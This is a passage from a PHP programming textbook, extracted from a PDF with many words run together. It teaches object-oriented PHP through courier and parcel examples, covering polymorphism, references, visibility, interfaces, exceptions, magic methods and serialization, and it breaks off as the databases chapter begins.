function, andusing itmeans wecanmake assumptions inourcode about the
properties andmethods thatwill beavailable asaresult. \
Polymorphism
Imagine weallowed auser toaddcouriers totheir own listofpreferred suppliers.
Wecould write afunction along these lines:
function saveAsPreferredSupplier(Courier $courier) {
  // add to list and save
  return true;
}
This would work well—but what ifwewanted tostore aPigeonPost object?
Infact, ifwepass aPigeonPost object into thisfunction, PHP will realize thatit’s
achild oftheCourier object, andthefunction will accept it.This allows ustouse
parent objects fortype hinting andpass inchildren, grandchildren, andeven distant
descendants ofthatobject tothefunction.
This ability toidentify both asaPigeonPost object andasaCourier object iscalled
polymorphism ,which literally means “many forms.” OurPigeonPost object will
identify asboth itsown class andaclass thatitdescends from, andnotonly when
type hinting. Check outthisexample thatuses theinstanceOf operator tocheck
what kind ofobject something is:
$courier = new PigeonPost('Local Avian Delivery Ltd');
if($courier instanceOf Courier) {
    echo $courier->name . " is a Courier\n";
}
if($courier instanceOf PigeonPost) {
    echo $courier->name . " is a PigeonPost\n";
}PHP Master: W rite Cutting-edge Code 14
www.it-ebooks.info
if($courier instanceOf Parcel) {
    echo $courier->name . " is a Parcel\n";
}
This code, when run, gives thefollowing output:
Local Avian Delivery Ltd is a Courier
Local Avian Delivery Ltd is a PigeonPost
Exactly asitdoes when wetype hint, thePigeonPost object claims tobeboth a
PigeonPost andaCourier .Itisnot,however ,aParcel .
Objects and Refer ences
When wework with objects, it’simportant toavoid tripping uponthefactthatthey
behave very differently from thesimpler variable types. Most data types arecopy-
on-write ,which means thatwhen wedo$a = $b ,weendupwith twoindependent
variables containing thesame value.
Forobjects, thisworks completely differently .What would youexpect from the
following code?
$box1 = new Parcel();
$box1->destinationCountry = 'Denmark';
$box2 = $box1;
$box2->destinationCountry = 'Brazil';
echo 'Parcels need to ship to: '
  . $box1->destinationCountry . ' and '
  . $box2->destinationCountry;
Have athink about thatforamoment.
Infact, theoutput is:
Parcels need to ship to: Brazil and Brazil
What happens here isthatwhen weassign$box1 to$box2 ,thecontents of$box1
aren’t copied. Instead, PHP justgives us$box2 asanother way torefer tothesame
object. This iscalled areference .15 Object Oriented Pr ogramming
www.it-ebooks.info
Wecantellwhether twoobjects have thesame class andproperties bycomparing
them with==,asshown below:
if($box1 == $box2) echo 'equivalent';
Wecantake thisastep further ,anddistinguish whether they arereferences tothe
original object, byusing the===operator inthesame way:
if($box1 === $box2) echo 'exact same object!';
The===comparison will only return true when both variables arepointing tothe
same value. Iftheobjects areidentical, butstored indifferent locations, thisoperation
will return false. This canhelp ushugely inidentifying which objects arelinked
tooneanother ,andwhich arenot.
Passing Objects as Function P arameters
Continuing onfrom where weleftoffabout references, wemust bear inmind that
objects arealways passed byreference .This means thatwhen youpass anobject
intoafunction, thefunction operates onthatsame object, andifitischanged inside
thefunction, thatchange isreflected outside. This isanextension ofthesame beha-
vior weseewhen weassign anobject toanew variable.
Objects always behave thisway—they willprovide areference totheoriginal object
rather than produce acopy ofthemselves, which canlead tosurprising results!
Takealook atthiscode example:
$courier = new PigeonPost('Avian Delivery Ltd');
$other_courier = $courier;
$other_courier->name = 'Pigeon Post';
echo $courier->name; // outputs "Pigeon Post"
It’simportant tounderstand thissothatourexpectations lineupwith PHP’ sbeha-
vior; objects willgiveareference tothemselves, rather than make acopy .This means
thatifafunction operates onanobject thatwaspassed in,there’ snoneed forusto
return itfrom thefunction. Thechange will bereflected intheoriginal copy ofthe
object too.PHP Master: W rite Cutting-edge Code 16
www.it-ebooks.info
Ifaseparate copy ofanexisting object isneeded, wecancreate onebyusing the
clone keyword. Here’ sanadapted version oftheprevious code, tocopy theobject
rather than refer toit:
$courier = new PigeonPost('Avian Delivery Ltd');
$other_courier = clone $courier;
$other_courier->name = 'Pigeon Post';
echo $courier->name; // outputs "Avian Delivery Ltd"
Theclone keyword causes anew object tobecreated ofthesame class, andwith
allthesame properties, astheoriginal object. There’ snolink between these two
objects, andyoucansafely change oneortheother inisolation.
Shallow Object Copies
When youclone anobject, anyobjects stored inproperties within itwillberefer-
ences rather than copies. Asaresult, youneed tobecareful when dealing with
complex object oriented applications.
PHP hasamagic method which, ifdeclared intheobject, iscalled when theobject
iscopied. This isthe__clone() method, andyoucandeclare andusethistodictate
what happens when theobject iscopied, oreven disallow copying.
Fluent Interfaces
Atthispoint, weknow thatobjects arealways passed byreference, which means
thatwedon’t need toreturn anobject from amethod inorder toobserve itschanges.
However ,ifwedoreturn$this from amethod, wecanbuild afluent interface into
ourapplication, which will enable youtochain methods together .Itworks like
this:
1.Create anobject.
2.Call amethod ontheobject.
3.Receive theamended object returned bythemethod.
4.Optionally return tostep 2.
This might beclearer toshow with anexample, sohere’ soneusing theParcel class:17 Object Oriented Pr ogramming
www.it-ebooks.info
chapter_01/Par cel.php
class Parcel
{
  protected $weight;
  protected $destinationCountry;
  public function setWeight($weight) {
    echo "weight set to: " . $weight . "\n";
    $this->weight = $weight;
    return $this;
  }
  public function setCountry($country) {
    echo "destination country is: " . $country . "\n";
    $this->destinationCountry = $country;
    return $this;
  }
}
$myparcel = new Parcel();
$myparcel->setWeight(5)->setCountry('Peru');
What’ skeyhere isthatwecanperform these multiple calls allononeline(poten-
tially with some newlines forreadability), andinanyorder .Since each method re-
turns theresulting object, wecanthen callthenext method onthat, andsoon.You
may seethispattern inanumber ofsettings, andnow youcanalso build itinto
your own applications, ifappropriate.
public , private , and protected
Intheexamples presented inthischapter ,we’ve used thepublic keyword before
allourmethods andproperties. This means thatthese methods andproperties can
beread andwritten from outside oftheclass.public isanaccess modifier ,and
there aretwoalternatives: private andprotected .Let’slook atthem inturn.
public
This isthedefault behavior ifyouseecode thatomits thisaccess modifier .It’sgood
practice, though, toinclude thepublic keyword, even though thebehavior isthe
same without it.Aswell asthere being noguarantees thedefault won’t change inPHP Master: W rite Cutting-edge Code 18
www.it-ebooks.info
thefuture, itshows thatthedeveloper made aconscious choice toexpose this
method orproperty .
private
Making amethod orproperty private means thatitwillonly bevisible from inside
theclass inwhich it’sdeclared. Ifyoutrytoaccess itfrom outside, you’ll seean
error .Agood example would betoaddamethod thatfetches theshipping ratefor
agiven country toourCourier class definition from earlier inthechapter .This is
only needed inside thefunction asahelper tocalculate theshipping, sowecan
make itprivate:
chapter_01/Courier .php (excerpt)
class Courier
{
  public function calculateShipping(Parcel $parcel) {
    // look up the rate for the destination
    $rate = $this->getShippingRateForCountry($parcel-> ➥
      destinationCountry);
    // calculate the cost
    $cost = $rate * $parcel->weight;
    return $cost;
  }
  private function getShippingRateForCountry($country) {
    // some excellent rate calculating code goes here
    // for the example, we'll just think of a number
    return 1.2;
  }
}
Using aprivate method makes itclear thatthisfunction isdesigned tobeused from
within theclass, andstops itfrom being called from elsewhere intheapplication.
Making aconscious decision about which functions arepublic andwhich aren’t is
animportant part ofdesigning object oriented applications.
protected
Aprotected property ormethod issimilar toaprivate method, inthatitisn’t
available from everywhere. Itcanbeaccessed from anywhere within theclass it’s
declared in,but,importantly ,itcanalso beaccessed from anyclass which inherits19 Object Oriented Pr ogramming
www.it-ebooks.info
from thatclass. InourCourier example with theprivate method
getShippingRateForCountry() (called bythecalculateShipping() method),
everything works fine, and, infact, child classes ofCourier willalsowork correctly .
However ,ifachild class needed tore-implement thecalculateShipping() method
touseitsown formula, thegetShippingRateForCountry() method would beun-
available.
Usingprotected means thatthemethods arestillunavailable from outside the
class, butthatchildren oftheclass count as“inside,” andhave access tousethose
methods orread/write those properties.
Choosing the Right Visibility
Tochoose thecorrect visibility foreach property ormethod, follow thedecision-
making process depicted inFigure 1.2.
Figur e 1.2. How to choose visibility for a pr operty or method
Thegeneral principle isthatifthere’ snoneed forthings tobeaccessible outside
oftheclass, they shouldn’t be.Having asmaller visible area ofaclass makes it
simpler forother parts ofthecode touse,andeasier fordevelopers new tothiscode
tounderstand.1Making itprivate canbelimiting ifweextend thisfunctionality at
1This includes you, ifyou’ve slept since youwrote thecode.PHP Master: W rite Cutting-edge Code 20
www.it-ebooks.info
alater date, soweonly dothisifwe’re sure it’sneeded; otherwise, theproperty or
method should beprotected.
Using Getters and Setters to Contr ol Visibility
Intheprevious section, weoutlined aprocess todecide which access modifier a
property ormethod would need. Another approach tomanaging visibility istomark
allproperties asprotected, andonly allow access tothem using getter andsetter
methods. They doexactly astheir name implies, allowing youtogetandsetthe
values.
Getter andsetter methods look likethis:
chapter_01/Courier .php (excerpt)
class Courier {
  protected $name;
  function getName() {
    return $this->name;
  }
  function setName($value) {
    $this->name = $value;
    return true;
  }
}
This might seem overkill, andinsome situations that’sprobably agood assessment.
Ontheother hand, it’savery useful device forgiving traceability toobject code
thataccesses properties. Ifevery time theproperty isaccessed, ithastocome through
thegetter andsetter methods, thisprovides ahook ,orintercept point, ifweneed
it.Wemight hook into these methods tologwhat information wasupdated, orto
addsome access control logic, oranyoneofanumber ofreasons. Whether you
choose tousegetter andsetter methods, ortoaccess properties directly ,theright
approach varies between applications. Showing youboth approaches gives youthe
tools todecide which isthebest fit.21 Object Oriented Pr ogramming
www.it-ebooks.info
Underscor es and Visibility
InPHP 4,everything waspublic, andsoitwasacommon convention toprefix
non-public methods andproperties with anunderscore. Youmay stillseethisin
legacy applications, aswell asinsome current coding standards. While itisun-
necessary andsome dislike it,theimportant point istoconform tothecoding
standards oftheproject (more onthose inChapter 8).
Using Magic __get  and __set  Methods
While we’re onthetopic ofgetters andsetters, let’stake asmall detour andlook at
twomagic methods available inPHP:__get() and__set() .
These arecalled when youaccess aproperty thatdoesn’t exist .Ifthatsounds
counterintuitive, let’sseeifacode sample canmake things clearer:
chapter_01/Courier .php (excerpt)
class Courier 
{
  protected $data = array();
  public function __get($property) {
    return $this->data[$property];
  }
  public function __set($property, $value) {
    $this->data[$property] = $value;
    return true;
  }
}
Thecode above will beinvoked when wetrytoread from orwrite toaproperty
thatdoesn’t exist intheclass. There’ sa$data property thatwill actually hold our
values, butfrom theoutside oftheclass, itwill look asifwe’re justaccessing
properties asnormal. Forexample, wemight write code likethis:
$courier = new Courier();
$courier->name = 'Avian Carrier';
echo $courier->name;PHP Master: W rite Cutting-edge Code 22
www.it-ebooks.info
From thisangle, we’re unable toseethatthe$name property doesn’t exist, butthe
object behaves asifitdoes. Themagic__get() and__set() methods allow usto
change what happens behind thescenes. Wecanaddanylogic weneed tohere,
having itbehave differently fordifferent property names, checking values, orany-
thing elseyoucanthink of.AllPHP’ smagic methods provide uswith aplace to
putincode thatresponds toaparticular event; inthiscase, theaccess ofanon-ex-
istent property .
Interfaces
Aninterface isawayofdescribing thecapabilities ofanobject. Aninterface specifies
thenames ofmethods andtheir parameters, butexcludes anyfunctioning code.
Using aninterface lays outacontract ofwhat aclass implementing thisinterface
will becapable of.Unlike inheritance, wecanapply interfaces tomultiple classes,
regardless ofwhere they areinthehierarchy .Interfaces applied tooneclass will
then beinherited bytheir children.
SPL Countable Interface Example
Theinterface itself holds only anoutline ofthefunctions intheinterface; there is
noactual implementation included here. Asanexample, let’slook attheCountable
interface.2This isacore interface inPHP,implemented intheSPL (Standard PHP
Library) extension. Countable implements asingle function, count() .Tousethis
interface inourown code, wecanimplement itasshown here:
chapter_01/Courier .php (excerpt)
class Courier implements Countable
{
  protected $count = 0;
  public function ship(Parcel $parcel) {
    $this->count++;
    // ship parcel
    return true;
  }
  public function count() {
2http://php.net/countable23 Object Oriented Pr ogramming
www.it-ebooks.info
    return $this->count;
  }
}
SinceCourier implements Countable inthisexample, ourclass must contain a
method with adeclaration thatexactly matches themethod declared intheinterface.
What goes inside themethod can(and islikely to)differ ineach class; wemust
simply present thefunction asdeclared.
Counting Objects
Using theCountable interface inPHP allows ustocustomize what happens when
auser calls thecore function count() with ourobject asthesubject. Bydefault, if
youcount() anobject inPHP,you’ll receive acount ofhow many properties ithas.
However ,implementing theCountable interface asshown above allows ustohook
into this. Wecannow take advantage ofthisfeature bywriting code likethis:
$courier = new Courier();
$courier->ship(new Parcel());
$courier->ship(new Parcel());
$courier->ship(new Parcel());
echo count($courier); // outputs 3
When weimplement interfaces, wemust always declare thefunctions defined in
aninterface. Inthenext section, we’ll goontodeclare anduseourown interfaces.
The Standar d PHP Libr ary
This section used theCountable interface asanexample ofaninterface built
intoPHP.TheSPLmodule contains some great features, andiswell worth alook.
Inparticular ,itoffers some useful interfaces, prebuilt iterator classes, andgreat
storage classes. It’sheavily object oriented, butafter reading thischapter ,you’ll
beready tousethose ideas inyour own applications.
Declaring and Using an Interface
Todeclare aninterface, wesimply usetheinterface keyword, name theinterface,
andthen prototype themethods thatbelong toit.Asanexample, we’ll define a
Trackable interface containing asingle method,getTrackInfo() :PHP Master: W rite Cutting-edge Code 24
www.it-ebooks.info
chapter_01/T rackable.php
interface Trackable
{
  public function getTrackInfo($parcelId);
}
Tousethisinterface inourclasses, wesimply usetheimplements keyword. Not
allourcouriers cantrack parcels, andtheway they dothatwill look different for
each one, asthey might usedifferent systems internally .IfourMonotypeDelivery
courier cantrack parcels, itsclass might look similar tothis:
chapter_01/MonotypeDeliver y.php (excerpt)
class MonotypeDelivery extends Courier implements Trackable
{
  public function ship($parcel) {
    // put in box
    // send and get parcel ID (we'll just pretend)
    $parcelId = 42;
    return $parcelId;
  }
  public function getTrackInfo($parcelId) {
    // look up some information
    return(array("status" => "in transit"));
  }
}
Wecanthen calltheobject methods asweusually would; theinterface simply
mandates thatthese methods exist. This allows ustobecertain thatthefunction
will exist andbehave asweexpect, even onobjects thatarenotrelated toonean-
other .
Identifying Objects and Interfaces
Interfaces aregreat—they letusknow which methods willbeavailable inanobject
thatimplements them. Buthow canweknow which interfaces areimplemented?
Atthispoint, wereturn totype hinting andtheinstanceOf operator again. Weused
them before tocheck ifobjects were ofaparticular type ofclass, orinherited from
thatclass. These techniques alsowork forinterfaces. Exactly aswhen wediscussed25 Object Oriented Pr ogramming
www.it-ebooks.info
polymorphism, where asingle object willidentify asitsown class andalsotheclass
ofanyancestor ,thatsame class will identify asanyinterface thatitimplements.
Look back attheprevious code sample, where ourMonotypeDelivery class inherited
fromCourier andimplemented theTrackable interface. Wecaninstantiate anobject
oftypeMonotypeDelivery ,andthen interrogate it:
$courier = new MonotypeDelivery();
if($courier instanceOf Courier) {
  echo "I'm a Courier\n";
}
if($courier instanceOf MonotypeDelivery) {
  echo "I'm a MonotypeDelivery\n";
}
if($courier instanceOf Parcel) {
  echo "I'm a Parcel\n";
}
if($courier instanceOf Trackable) {
  echo "I'm a Trackable\n";
}
/*
Output:
I'm a Courier
I'm a MonotypeDelivery
I'm a Trackable
*/
Asyoucansee,theobject admits tobeing aCourier ,aMonotypeDelivery ,anda
Trackable ,butdenies being aParcel .This isentirely reasonable, asitisn’t aParcel !
Exceptions
Exceptions areanobject oriented approach toerror handling. Some PHP extensions
will stillraise errors asthey used to;more modern extensions such asPDO3will
3PDO stands forPHP Database Objects, andyoucanread about itinChapter 2.PHP Master: W rite Cutting-edge Code 26
www.it-ebooks.info
instead throw exceptions. Exceptions themselves areobjects, andException isa
built-in class inPHP.AnException object will contain information about where
theerror occurred (thefilename andlinenumber), anerror message, and(optionally)
anerror code.
Handling Exceptions
Let’sstart bylooking athow tohandle functions thatmight throw exceptions. We’ll
useaPDOexample forthis, since thePDOextension throws exceptions. Here wehave
code which attempts tocreate adatabase connection, butfails because thehost
“nonsense” doesn’t exist:
$db = new PDO('mysql:host=nonsense');
Running thiscode gives afatal error ,because theconnection failed andthePDO
class threw anexception. Toavoid this, useatry/catch block:
try {
  $db = new PDO('mysql:host=nonsense');
  echo "Connected to database";
} catch (Exception $e) {
  echo "Oops! " . $e->getMessage();
}
This code sample illustrates thetry/catch structure. Inthetryblock, weplace
thecode we’d liketoruninourapplication, butwhich weknow may throw anex-
ception. Inthecatch block, weaddsome code toreact totheerror ,either by
handling it,logging it,ortaking whatever action isappropriate.
Note thatwhen anexception occurs, asitdoes here when wetrytoconnect tothe
database, PHP jumps straight into thecatch block without running anyoftherest
ofthecode inthetryblock. Inthisexample, thefailed database connection means
thatwenever seetheConnected to database message, because thislineofcode
fails togetarun.
No Finally Clause
Ifyou’ve worked with exceptions inother languages, youmight beused toa
try/catch/finally construct; PHP lacks theadditional finally clause.27 Object Oriented Pr ogramming
www.it-ebooks.info
Why Exceptions?
Exceptions areamore elegant method oferror handling than thetraditional approach
ofraising errors ofvarying levels. Wecanreact toexceptions inthecourse ofexe-
cution, depending onhow severe theproblem is.Wecanassess thesituation and
then tellourapplication torecover ,orbailoutgracefully .
Having exceptions asobjects means thatwecanextend exceptions (and there are
examples ofthisshortly), andcustomize their data andbehavior .Wealready know
how towork with objects, andthismakes iteasy toaddquite complicated function-
ality into ourerror handling ifweneed it.
Throwing Exceptions
We’ve seen how tohandle exceptions thrown bybuilt-in PHP functions, buthow
about throwing them ourselves? Well,wecertainly candothat:
// something has gone wrong
throw new Exception('Meaningful error message string');
Thethrow keyword allows ustothrow anexception; then weinstantiate an
Exception object tobethrown. When weinstantiate anexception, wepass inthe
error message asaparameter totheconstructor ,asshown intheprevious example.
This constructor canalso accept anoptional error code asthesecond parameter ,if
youwant topass acode aswell.
Extending Exceptions
Wecanextend theException object tocreate ourown classes with specific exception
types. ThePDOextension throws exceptions oftypePDOException ,forexample,
andthisallows ustodistinguish between database errors andanyother kind of
exception thatcould arise. Toextend anexception, wesimply useobject inheritance:
class HeavyParcelException extends Exception {} 
Wecansetanyproperties oraddanymethods wedesire tothisException class.
It’snotuncommon tohave defined butempty classes, simply togive amore specific
type ofexception, aswell asallow ustotellwhich part ofourapplication en-
countered aproblem without trying toprogrammatically read theerror message.PHP Master: W rite Cutting-edge Code 28
www.it-ebooks.info
Autoloading Exceptions
Earlier ,wecovered autoloading, defining rules forwhere tofind classes whose
definition hasn’t already been included inthecode executed inthisscript. Excep-
tions aresimply objects, sowecanuseautoloading toload ourexception classes
too.
Having specific exception classes means wecancatch different exception types,
andwe’ll look atthisinthenext section.
Catching Specific T ypes of Exception
Consider thiscode example, which canthrow multiple exceptions:
chapter_01/HeavyPar celException.php  (excerpt)
class HeavyParcelException extends Exception {}
class Courier{
  public function ship(Parcel $parcel) {
    // check we have an address
    if(empty($parcel->address)) {
      throw new Exception('Address not Specified');
    }
    // check the weight
    if($parcel->weight > 5) {
      throw new HeavyParcelException('Parcel exceeds courier ➥
        limit');
    }
    // otherwise we're cool
    return true;
  }
}
Theabove example shows anexception, HeavyParcelException ,which isempty .
TheCourier class hasaship() method, which canthrow both anException and
aHeavyParcelException .
Now we’ll trythiscode. Note thetwocatch blocks:29 Object Oriented Pr ogramming
www.it-ebooks.info
$myCourier = new Courier();
$parcel = new Parcel();
// add the address if we have it
$parcel->weight = rand(1,7);
try {
  $myCourier->ship($parcel);
  echo "parcel shipped";
} catch (HeavyParcelException $e) {
  echo "Parcel weight error: " . $e->getMessage();
  // redirect them to choose another courier
} catch (Exception $e) {
  echo "Something went wrong. " . $e->getMessage();
  // exit so we don't try to proceed any further
  exit;
}
Inthisexample, webegin byinstantiating bothCourier andParcel objects. The
parcel object should have both anaddress andaweight; wecheck forthese when
wetrytoship it.Note thatthisexample uses alittlerand() function toproduce a
variety ofparcel weights! This isafunway totestthecode, assome parcels aretoo
heavy andtrigger theexception.
Inthetryblock, weaskthecourier toship theparcel. Withanyluck, allgoes well
andweseethe“parcel shipped” message. There arealsotwocatch blocks toallow
ustoelegantly handle thefailure outcomes. Thefirstcatch block specifically catches
theHeavyParcelException ;anyother kind ofexception isthen caught bythemore
general secondcatch block. Ifwe’d caught theException first, allexceptions would
endupbeing caught here, somake sure thatthecatch blocks have themost specific
type ofexception first.
What’ sactually happening here isthatthecatch block isusing typehinting todis-
tinguish ifanobject isofanacceptable type. Soallwelearned earlier about type-
hinting andpolymorphism applies here; aHeavyParcelException isalso an
Exception .
Inthisexample, theexceptions arebeing thrown inside theclass, butcaught further
upthestack inthecode thatcalled theobject’ smethod. Exceptions, ifnotcaught,
willreturn totheir calling context, andifthey failtobecaught there, they’ll continue
tobubble upthrough thecallstack. Only when they gettothetopwithout being
caught will weseethefatal errorUncaught Exception .PHP Master: W rite Cutting-edge Code 30
www.it-ebooks.info
Setting a Global Exception Handler
Toavoid seeing fatal errors where exceptions have been thrown andourcode failed
tocatch them, wecansetadefault behavior forourapplication inthissituation.
Todothis, weuseafunction calledset_exception_handler() .This accepts a
callback asitsparameter ,sowecangive thename ofafunction touse,forexample.
Anexception handler will usually present anerror screen totheuser—much nicer
than afatal error message!
Abasic exception handler would look similar tothis:
function handleMissedException($e) {
  echo "Sorry, something is wrong. Please try again, or contact us ➥
    if the problem persists";
  error_log('Unhandled Exception: ' . $e->getMessage() 
    . ' in file ' . $e->getFile() . ' on line ' . $e->getLine());
}
set_exception_handler('handleMissedException');
throw new Exception('just testing!');
This shows anexception handler ,andthen thecalltoset_exception_handler()
toregister thisfunction tohandle uncaught exceptions. Usually ,thiswould bede-
clared andsetnear thebeginning ofyour script, orinabootstrap file,ifyouhave
one.
Default Err or Handler
Inaddition tousingset_exception_hander() tohandle exceptions, PHP also
hasset_error_handler() todeal with errors.
Ourexample exception handler used theerror_log() function towrite information
about theerror tothePHP error log.Thelogfile entry looked likethis:
[13-Jan-2012 11:25:41] Unhandled Exception: just testing! in file ➥
  /home/lorna/.../exception-handler.php on line 1331 Object Oriented Pr ogramming
www.it-ebooks.info
Working with Callbacks
Having justshown theuseofafunction name asacallback, it’sagood time tolook
attheother options available tous.Callbacks areused invarious aspects ofPHP.
Theset_exception_handler() andset_error_handler() functions aregood ex-
amples. Wecanalsousecallbacks, forexample, inarray_walk() —afunction where
weaskPHP toapply thesame operation, specified using acallback, toevery element
inanarray .
Callbacks cantake amultitude offorms:
■afunction name
■aclass name andmethod name, where themethod iscalled statically
■anobject andmethod name, where themethod iscalled against thesupplied
object
■aclosure (afunction stored inavariable)
■alambda function (afunction declared in-place)
Callbacks areoneofthetimes when itdoes make alotofsense touseananonymous
function. Thefunction wedeclare forourexception handler won’t beused from
anywhere elseintheapplication, sothere’ snoneed foraglobal name. There’ smore
information about anonymous functions ontherelated page inthePHP Manual.4
More Magic Methods
Already inthischapter ,we’ve witnessed afewmagic methods being used. Let’s
quickly recap ontheones we’ve seen, inTable 1.1.
Table 1.1. Magic Methods: A Summary
Runs when … Function
an object is instantiated __construct()
an object is destr oyed __destruct()
a nonexistent pr operty is r ead __get()
a nonexistent pr operty is written __set()
an object is copied __clone()
4http://php.net/manual/en/functions.anonymous.phpPHP Master: W rite Cutting-edge Code 32
www.it-ebooks.info
When wedefine these functions inaclass, wedefine what occurs when these events
happen. Without them, ourclasses exhibit default behavior ,andthat’soften allwe
need. There areadditional magic methods inPHP,andinthissection we’ll look at
some ofthemost frequently used.
Using __call()  and __callStatic()
The__call() method isanatural partner tothe __get() and__set() methods we
sawinthesection about access modifiers. Where__get() and__set() deal with
properties thatdon’t really exist,__call() does thesame formethods. When we
callamethod thatisn’t declared intheclass, the__call() method iscalled instead.
We’vebeen using aCourier class with aship() method, butwhat ifwealsowanted
tocallsendParcel() forthesame functionality? When wework with legacy systems,
wecanoften bereplacing onepiece ofanexisting system atatime, sothisisalikely
enough situation. Wecould adapt ourcourier’ sclass definition toinclude a
sendParcel() method, orwecould use__call() ,which would look like:
chapter_01/Courier .php (excerpt)
class Courier {
  public $name;
  public function __construct($name) {
    $this->name = $name;
    return true;
  }
  public function ship($parcel) {
    // sends the parcel to its destination
    return true;
  }
  public function __call($name, $params) {
    if($name == 'sendParcel') {
      // legacy system requirement, pass to newer send() method
      return $this->send($params[0]);
    } else {
      error_log('Failed call to ' . $name . ' in Courier class');
      return false;
    }
  }
}33 Object Oriented Pr ogramming
www.it-ebooks.info
Allthismagic definitely leaves scope forcreating some code masterpieces, making
itimpossible foranynormal person towork with them! When youuse__call()
instead ofdeclaring amethod, itwill beunavailable when theIDEautocompletes
method names forus.Themethod willfailtoshow upwhen wecheck ifafunction
exists inaclass, anditwill behard totrace when debugging. Forthissituation,
where there’ soldcode calling tooldmethod names, youcould argue thatit’sactually
afeature tonothave thefunction visible—it makes iteven clearer thatcode we
write today shouldn’t bemaking useofit.
Aswith allsoftware design, there arenohard andfastrules, butyoucandefinitely
have toomuch ofagood thing when itcomes tohaving “pretend” methods inyour
class, sousethisfeature inmoderation.
Inaddition tothe__call() method, asofPHP 5.3wealso have__callStatic() .
This does what youmight expect ittodo.Itwill becalled when wemake astatic
method calltoamethod thatdoesn’t exist inthisclass. Exactly like__call() ,
__callStatic() accepts themethod name andanarray ofitsarguments.
Printing Objects with __toString()
Have youever tried usingecho() with anobject? Bydefault, itsimply prints “Ob-
ject,” giving usvery little. Wecanusethe__toString() magic method tochange
thisbehavior ,or,tomake ourCourier class—for example—print abetter description,
wecould type:
chapter_01/Courier .php (excerpt)
class Courier {
  public $name;
  public $home_country;
  public function __construct($name, $home_country) {
    $this->name = $name;
    $this->home_country = $home_country;
    return true;
  }
  public function __toString() {
    return $this->name . ' (' . $this->home_country . ')';
  }
}PHP Master: W rite Cutting-edge Code 34
www.it-ebooks.info
Tousethefunctionality ,wejustuseourobject asastring; forexample, byechoing
it:
$mycourier = new Courier('Avian Services', 'Australia');
echo $mycourier;
This canbeavery handy trick when anobject isoutput frequently inthesame
format. Thetemplates cansimply output theobject, anditknows how toconvert
itself toastring.
Serializing Objects
Toserialize data inPHP means toconvert itinto atext-based format thatwecan
store, forexample, inadatabase. Wecanuseitonallsorts ofdata types, butit’s
particularly useful onarrays andobjects thatcan’t natively bewritten todatabase
columns, oreasily sent between systems without atextual representation ofthem-
selves.
Let’sfirst inspect asimple object usingvar_dump() ,andthen serialize it,togive
youanidea ofwhat thatwould look like:
$mycourier = new Courier('Avian Services', 'Australia');
var_dump($mycourier);
echo serialize($mycourier);
/*
output:
object(Courier)#1 (2) {
  ["name"]=>
  string(14) "Avian Services"
  ["home_country"]=>
  string(9) "Australia"
}
O:7:"Courier":2:{s:4:"name";s:14:"Avian Services";s:12: ➥
  "home_country";s:9:"Australia";}
*/
When weserialize anobject, wecanunserialize itinanysystem where theclass
definition oftheobject isavailable. There aresome object properties, however ,that35 Object Oriented Pr ogramming
www.it-ebooks.info
wedon’t want toserialize, because they’d beinvalid inanyother context. Agood
example ofthisisaresource; afilepointer would make nosense ifunserialized at
alater point, oronatotally different platform.
Tohelp usdeal with thissituation, PHP provides the__sleep() and__wakeup()
methods, which arecalled when serializing andunserializing, respectively .These
methods allow ustoname which properties toserialize, andfillinanythataren’t
stored when theobject is“woken.” Wecanvery quickly design ourclasses totake
advantage ofthis. Toillustrate, how about adding afilehandle toourclass forlogging
errors?
chapter_01/Courier .php (excerpt)
class Courier {
  public $name;
  public $home_country;
  public function __construct($name, $home_country) {
    $this->name = $name;
    $this->home_country = $home_country;
    $this->logfile = $this->getLogFile();
    return true;
  }
  protected function getLogFile() {
    // error log location would be in a config file
    return fopen('/tmp/error_log.txt', 'a');
  }
  public function log($message) {
    if($this->logfile) {
      fputs($this->logfile, 'Log message: ' . $message . "\n");
    }
  }
  public function __sleep() {
    // only store the "safe" properties
    return array("name", "home_country");
  }
  public function __wakeup() {
    // properties are restored, now add the logfile
    $this->logfile = $this->getLogFile();PHP Master: W rite Cutting-edge Code 36
www.it-ebooks.info
    return true;
  }
}
Using magic methods inthisway allows ustoavoid thepitfalls ofserializing are-
source, orlinking toanother object oritem thatwould become invalid. This enables
ustostore ourobjects safely ,andadapt asnecessary totheir particular requirements.
Objective Achieved
During thecourse ofthischapter ,we’ve come into object oriented theory ,anddis-
cussed how itcanbeuseful toassociate asetofvariables andfunctionality intoone
unit. Wecovered basic useofproperties andmethods, how tocontrol visibility to
different class elements, andlooked athow wecancreate consistency between
classes using inheritance andinterfaces. Exception handling gives usanelegant
way ofdealing with anymishaps inourapplications, andwealso looked atmagic
methods forsome very neat tricks tomake development easier .Atthispoint, we’re
ready togoonanduseobject oriented interfaces intheextensions andlibraries we
work with inourday-to-day lives, aswell asbuild ourown libraries andapplications
thisway.37 Object Oriented Pr ogramming
www.it-ebooks.info
www.it-ebooks.info
Chapter2
Databases
Databases anddata storage arekeycomponents ofanydynamic web application.
It’simportant togain anoverview ofwhen touseadatabase, andespecially how
tousethePDO (PHP Data Object) extension toconnect toadatabase. ThePDO ex-
tension examples we’ll begoing through useMySQL ,probably themost popular
structured query language used tocommunicate with databases. However ,PDO can
beused inthesame way with many database platforms, soregardless ofwhat kind
ofdatabase your project contains, there’ll beplenty ofinformation foryoutosoak
uphere.
We’realso going toinvestigate some handy tipsforgood database design, sothat
youcanmaximize your application’ sefficiency andperformance.
Persistent Data and W eb Applications
There aretworeasons why we’d usually store information inaweb application,
rather than merely provide ourcontent toaweb user asasimple static page:
1.Because thecontent isdynamic, itcanbeconstantly updated andedited, or
drawn from another system.
www.it-ebooks.info
2.Youcanpresent user-specific content towebsite visitors.
Thefirst point might berelevant to,forexample, aCMS (Content Management
System) orsimilar application. Thesecond point would arise when awebsite con-
tains amember’ sarea, accessed through login andpassword fields, andpersonalized
elements areadded—such asanoutput greeting thatuser bytheir name, anddis-
playing information specific tothem (think aView Profile orEdit Profile page).
Increasingly ,we’re moving away from aworld where pages arejustcreated and
then published; instead, theWebispopulated bysystems thatmanage itscontent
through web-based tools. Even apage without alogged-in user will draw elements
from adatabase todisplay content, navigation, andother elements. Thedays of
using PHP purely toemail acontact form aremost definitely behind us!
When wework with user data, we’re really working around thestateless nature of
theWeb.This means thatthere’ snolinkbetween consecutive requests bythesame
user; each incoming request isjustarequest, onethattheserver takes onboard and
responds tousing only theinformation thatarrived with thatrequest, inorder to
work outwhat todo.This isindirect contrast toatraditional desktop application,
where theuser logs inonce, andtheconnection between theclient andtheserver
remains inplace fortheduration ofthesession. Working with theWebnow means
weneed tolearn tostore andload data efficiently andappropriately foreach request
made totheserver .
Choosing How to Stor e Data
